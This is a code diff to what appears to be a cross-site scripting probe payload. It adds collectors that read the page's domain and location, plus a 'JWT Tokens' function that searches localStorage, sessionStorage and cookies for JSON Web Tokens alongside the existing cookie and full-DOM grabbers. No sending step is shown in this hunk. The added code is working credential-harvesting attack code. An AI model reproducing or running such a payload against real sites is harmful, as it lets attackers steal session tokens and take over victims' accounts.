@@ -26,6 +26,12 @@
       Location: function () {
         return location.toString();
       },
+      "Document Domain": function () {
+        return document.domain;
+      },
+      "Document Location": function () {
+        return document.location.toString();
+      },
       Cookies: function () {
         return document.cookie;
       },
@@ -40,6 +46,41 @@
       },
       Origin: function () {
         return location.origin;
+      },
+      "JWT Tokens": function () {
+        // Attempt to find JWTs in localStorage, sessionStorage, and cookies
+        var tokens = [];
+        var jwtRegex = /ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*/g;
+
+        function searchStorage(storage) {
+          for (var i = 0; i < storage.length; i++) {
+            var key = storage.key(i);
+            var value = storage.getItem(key);
+            if (value && typeof value === 'string') {
+              var matches = value.match(jwtRegex);
+              if (matches) {
+                matches.forEach(function (m) {
+                  if (!tokens.includes(m)) tokens.push(m);
+                });
+              }
+            }
+          }
+        }
+
+        try { searchStorage(localStorage); } catch (e) { }
+        try { searchStorage(sessionStorage); } catch (e) { }
+        try {
+          if (document.cookie) {
+            var cookieMatches = document.cookie.match(jwtRegex);
+            if (cookieMatches) {
+              cookieMatches.forEach(function (m) {
+                if (!tokens.includes(m)) tokens.push(m);
+              });
+            }
+          }
+        } catch (e) { }
+
+        return tokens.length > 0 ? tokens.join("\n") : "None found";
       },
       DOM: function () {
         return document.documentElement.outerHTML
